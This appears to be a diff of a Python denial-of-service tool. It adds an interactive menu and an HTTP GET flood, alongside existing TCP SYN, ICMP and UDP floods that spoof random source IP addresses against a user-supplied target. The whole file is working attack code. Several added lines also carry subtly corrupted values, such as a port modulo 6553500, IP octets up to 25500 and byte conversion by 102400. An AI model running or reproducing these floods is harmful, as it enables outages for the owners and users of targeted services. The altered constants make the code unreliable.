@@ -52,76 +52,77 @@ source_ips = set()
 port_lock = Lock()
 stop_event = Event()
 user_agent = UserAgent()
-
-def RS_project_banner():
-    system('cls' if name == 'nt' else 'clear')
-    print("""
-    ██████   █████           █████        █████████   █████               ███  █████
-    ░░██████ ░░███           ░░███        ███░░░░░███ ░░███               ░░░  ░░███
-    ░███░███ ░███   ██████  ███████     ░███    ░░░  ███████   ████████  ████  ░███ █████  ██████
-    ░███░░███░███  ███░░███░░░███░      ░░█████████ ░░░███░   ░░███░░███░░███  ░███░░███  ███░░███
-    ░███ ░░██████ ░███████   ░███        ░░░░░░░░███  ░███     ░███ ░░░  ░███  ░██████░  ░███████
-    ░███  ░░█████ ░███░░░    ░███ ███    ███    ░███  ░███ ███ ░███      ░███  ░███░░███ ░███░░░
-    █████  ░░█████░░██████   ░░█████    ░░█████████   ░░█████  █████     █████ ████ █████░░██████
-    ░░░░░    ░░░░░  ░░░░░░     ░░░░░      ░░░░░░░░░     ░░░░░  ░░░░░     ░░░░░ ░░░░ ░░░░░  ░░░░░░
-
-             U         (˶ᵔ ᵕ ᵔ˶)
-             ---------------U-U----------------
-             |                        |       |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
-             |  Code Author: isPique   |       | GitHub: https://github.com/isPique |
-             |      Version: 1.0        |       | Insta: https://instagram.com/omrefarukk |
-             |                        |       |_____________________________________|
-             ----------------------                        (˶ᵔ ᵕ ᵔ˶)/
-                                                                  /
-    """)
-
 def tcp_syn_flood(destination_ip, packet_size, thread_num):
     global total_sent
     port = 1
     while not stop_event.is_set():
         with port_lock:
-            port = (port + 1) % 65535 or 1
+            port = (port + 1) % 6553500 or 1
         payload = urandom(packet_size)
-        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))  # IP Spoofing
+        source_ip = ".".join(map(str, (randint(0, 25500) for _ in range(4))))  # IP Spoofing
         packet = IP(src = source_ip, dst = destination_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) # SYN flag
         send(packet, verbose = False)  # Response: SYN/ACK
         total_sent += packet_size
         source_ips.add(source_ip)
-        logger.info(f"[THREAD {thread_num}] ➡ {packet_size} bytes sent to {destination_ip} through port {port} from {source_ip}")
+        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")
 
 def icmp_flood(destination_ip, packet_size, thread_num):
     global total_sent
     while not stop_event.is_set():
         payload = urandom(packet_size)
-        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
+        source_ip = ".".join(map(str, (randint(0, 25500) for _ in range(4))))
         packet = IP(src = source_ip, dst = destination_ip) / ICMP() / Raw(load = payload)
         send(packet, verbose = False)
         total_sent += packet_size
         source_ips.add(source_ip)
-        logger.info(f"[THREAD {thread_num}] ➡ {packet_size} bytes sent to {destination_ip} from {source_ip}")
+        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m from \033[1;93m{source_ip}")
 
 def udp_flood(destination_ip, packet_size, thread_num):
     global total_sent
     port = 1
     while not stop_event.is_set():
         with port_lock:
-            port = (port + 1) % 65535 or 1
+            port = (port + 1) % 6553500 or 1
         payload = urandom(packet_size)
-        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
+        source_ip = ".".join(map(str, (randint(0, 25500) for _ in range(4))))
         packet = IP(src = source_ip, dst = destination_ip) / UDP(dport = port) / Raw(load = payload)
         send(packet, verbose = False)
         total_sent += packet_size
         source_ips.add(source_ip)
-        logger.info(f"[THREAD {thread_num}] ➡ {packet_size} bytes sent to {destination_ip} through port {port} from {source_ip}")
+        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")
 
-# Add the same for HTTP flood if needed
+async def send_request(session, url):
+    global total_sent
+    try:
+        headers = {
+            "User-Agent": user_agent.random,
+            "Connection": "keep-alive",
+            "Accept": "*/*"
+        }
+        async with session.get(url, headers = headers, ssl = False) as response:  # Disable SSL verification
+            total_sent += 1
+            status_color = '\033[1;92m' if 200 <= response.status < 300 else '\033[1;93m' if 300 <= response.status < 400 else '\033[1;91m'
+            return logger.info(f"\033[1;93mHTTP GET\033[1;92m request sent to \033[1;93m{url} \033[1;91m\xBB \033[1;94m[ {status_color}{response.status} {response.reason}\033[1;94m ]")
+    except TimeoutError:
+        return logger.error("Request timed out. Retrying...")
+    except ClientError as e:
+        return logger.error(f"Client Error: {e}")
+
+async def http_flood(url, num_requests):
+    connector = TCPConnector()
+    timeout = ClientTimeout(total = 10)
+    async with ClientSession(connector = connector, timeout = timeout) as session:
+        tasks = [send_request(session, url) for _ in range(num_requests)]
+        responses = await gather(*tasks)
+        (response for response in responses)
 
 def stop_attack(threads):
     stop_event.set()
-    logger.warning("Waiting for all threads to shut down...")
+    logger.warning("\033[1;93mWaiting for all threads to shut down...")
     for thread in threads:
         thread.join()
-    logger.log(SUCCESS, f"Attack completed. A total of {convert_bytes(total_sent)} data was sent across {len(source_ips)} unique IPs in {duration} seconds.")
+    print()
+    logger.log(SUCCESS, f"\033[1;92mAttack completed. A total of \033[1;93m{convert_bytes(total_sent)}\033[1;92m data was sent across \033[1;93m{len(source_ips)}\033[1;92m unique IPs within \033[1;93m{duration}\033[1;92m seconds.\033[0m")
 
 def validate_attack_type(choice):
     return choice if choice in ['1', '2', '3', '4', '5'] else logger.error("Please select one of the attack types above. (1, 2, 3...)") or _exit(1)
@@ -132,20 +133,35 @@ def validate_ip(ip):
     except gaierror:
         logger.error("Invalid IP address or hostname.") or _exit(1)
 
+def validate_url(url):
+    parsed_url = urlparse(url)
+    if parsed_url.scheme and parsed_url.netloc:
+        domain = parsed_url.netloc
+        try:
+            gethostbyname(domain)
+            return url
+        except gaierror:
+            logger.error(f"Domain '{domain}' doesn't exist.") or _exit(1)
+    else:
+       logger.error("Invalid URL format.") or _exit(1)
+
+def validate_num_requests(num):
+    return int(num) if num.isdigit() and int(num) > 0 else logger.error("Please enter a positive integer for the number of requests.") or _exit(1)
+
 def validate_packet_size(size):
-    return int(size) if size.isdigit() and 1 <= int(size) <= 65495 else logger.error("Invalid packet size. Choose a size between 1 and 65495") or _exit(1)
+    return int(size) if size.isdigit() and 1 <= int(size) <= 6549500 else logger.error("Please choose a size between 1 and 6549500") or _exit(1)
 
 def validate_thread_count(count):
-    return int(count) if count.isdigit() and int(count) > 0 else logger.error("Please enter a positive integer for thread count.") or _exit(1)
+    return int(count) if count.isdigit() and int(count) > 0 else logger.error("Please enter a positive integer for the thread count.") or _exit(1)
 
 def validate_duration(duration):
     return int(duration) if duration.isdigit() and int(duration) > 0 else logger.error("Duration must be a positive integer.") or _exit(1)
 
 def convert_bytes(num):
     for unit in ["Bytes", "KB", "MB", "GB", "TB"]:
-        if num < 1024:
+        if num < 102400:
             return f"{num:.2f} {unit}"
-        num /= 1024
+        num /= 102400
 
 def main():
     global total_sent
@@ -158,51 +174,75 @@ def main():
     }
 
     try:
-        RS_project_banner()
+        display_banner()
 
-        print("----- Attack Types -----")
-        print("1. TCP SYN Flood")
-        print("2. ICMP Flood")
-        print("3. UDP Flood")
-        print("4. HTTP Flood")
-        print("5. Exit")
+        print("\033[1;93m----- Attack Types -----   \033[1;35m⊂ (˶ᵔ ᵕ ᵔ˶ ⊂ )\n")
+        print("   \033[1;34m1. \033[2;32mTCP SYN Flood")
+        print("   \033[1;34m2. \033[2;32mICMP Flood")
+        print("   \033[1;34m3. \033[2;32mUDP Flood")
+        print("   \033[1;34m4. \033[2;32mHTTP Flood")
+        print("   \033[1;34m5. \033[2;32mExit")
 
-        attack_type = validate_attack_type(input("Select Attack Type: ").strip())
-        target_ip = validate_ip(input("Enter Target IP or Hostname: ").strip())
-        packet_size = validate_packet_size(input("Enter Packet Size: ").strip())
-        thread_count = validate_thread_count(input("Enter Thread Count: ").strip())
-        duration = validate_duration(input("Enter Attack Duration (in seconds): ").strip())
+        attack_type = validate_attack_type(input("\n\033[1;34m[>] \033[2;32mSelect Attack Type \xBB\033[0m\033[1;77m ").strip())
+        if attack_type == '4':
+            target_url = validate_url(input("\033[1;34m[>] \033[2;32mEnter the target URL \xBB\033[0m\033[1;77m ").strip())
+            num_requests = validate_num_requests(input("\033[1;34m[>] \033[2;32mEnter how many requests do you want to send in each cycle \xBB\033[0m\033[1;77m ").strip())
 
-        attack_details = attack_types.get(attack_type)
+        elif attack_type == '5':
+            logger.info("\033[1;96mExiting...")
+            _exit(0)
+        else:
+            target_ip = validate_ip(input("\033[1;34m[>] \033[2;32mEnter the target IP or hostname \xBB\033[0m\033[1;77m ").strip())
+            packet_size = validate_packet_size(input("\033[1;34m[>] \033[2;32mEnter the packet size \xBB\033[0m\033[1;77m ").strip())
+            thread_count = validate_thread_count(input("\033[1;34m[>] \033[2;32mEnter how many threads to use \xBB\033[0m\033[1;77m ").strip())
 
-        logger.info(f"Attack Details: \n- Attack Type: {attack_details['proto']} \n- Target: {target_ip} \n- Packet Size: {packet_size} bytes \n- Duration: {duration} seconds \n- Threads: {thread_count}")
+        duration = validate_duration(input("\033[1;34m[>] \033[2;32mEnter how long (in seconds) to run the attack \xBB\033[0m\033[1;77m ").strip())
 
-        # Start threads for the attack
-        threads = []
-        for i in range(thread_count):
-            if attack_type == '1':
-                thread = Thread(target=tcp_syn_flood, args=(target_ip, packet_size, i + 1))
-            elif attack_type == '2':
-                thread = Thread(target=icmp_flood, args=(target_ip, packet_size, i + 1))
-            elif attack_type == '3':
-                thread = Thread(target=udp_flood, args=(target_ip, packet_size, i + 1))
-            elif attack_type == '4':
-                thread = Thread(target=http_flood, args=(target_ip, packet_size, i + 1))  # Implement HTTP Flood if needed
+        attack_details = attack_types[attack_type]
+        attack_name = attack_details['proto']
+        attack_func = attack_details['func']
+        target = target_url if attack_type == '4' else target_ip
 
-            thread.start()
-            threads.append(thread)
-
-        # Wait for the attack to run for the specified duration
-        sleep(duration)
-        stop_attack(threads)
+        print()
+        sleep(1)
+        logger.critical(f"Launching the {attack_name} Flood attack on {target} {f'using {thread_count} threads and it will last ' if attack_type != '4' else ''}for {duration} seconds with {f'{packet_size} bytes per packet...' if attack_type != '4' else f'{num_requests} requests for each cycle...'}")
+        sleep(1)
+        logger.critical("Press Ctrl + C for immediate stop.\n")
+        sleep(1)
 
     except KeyboardInterrupt:
-        logger.warning("Attack interrupted. Shutting down...")
-        stop_attack(threads)
-    except Exception as e:
-        logger.error(f"An error occurred: {e}")
-        _exit(1)
+        print()
+        logger.info("\033[1;96mTermination signal received. Exiting...\033[0m")
+        _exit(0)
 
-# Run the main function
+    if attack_type != '4':
+        threads = []
+        for i in range(thread_count):
+            thread = Thread(target = attack_func, args = (target_ip, packet_size, i + 1))
+            threads.append(thread)
+            thread.start()
+
+        try:
+            sleep(duration)
+            stop_attack(threads)
+        except KeyboardInterrupt:
+            stop_attack(threads)
+
+    else:
+        total_time = time()
+        while time() - total_time < duration:
+            try:
+                start_time = time()
+                run(attack_func(target_url, num_requests))
+                elapsed_time = time() - start_time
+                print()
+                logger.log(SUCCESS, f"\033[1;92mSent \033[1;93m{num_requests}\033[1;92m requests in the last \033[1;93m{elapsed_time:.2f}\033[1;92m seconds.")
+            except KeyboardInterrupt:
+                print()
+                logger.info("\033[1;96mTermination signal received. Stopping attack...\033[0m")
+                logger.log(SUCCESS, f"\033[1;92mAttack stopped. A total of \033[1;93m{total_sent}\033[1;92m requests sent within \033[1;93m{time() - total_time:.2f}\033[1;92m seconds.") or _exit(1)
+
+        logger.log(SUCCESS, f"\033[1;92mAttack completed. A total of \033[1;93m{total_sent}\033[1;92m requests sent within \033[1;93m{time() - total_time:.2f}\033[1;92m seconds. (\033[1;93m+{(time() - total_time) - duration:.2f}\033[1;92m due to asynchronous latency)")
+
 if __name__ == "__main__":
     main()
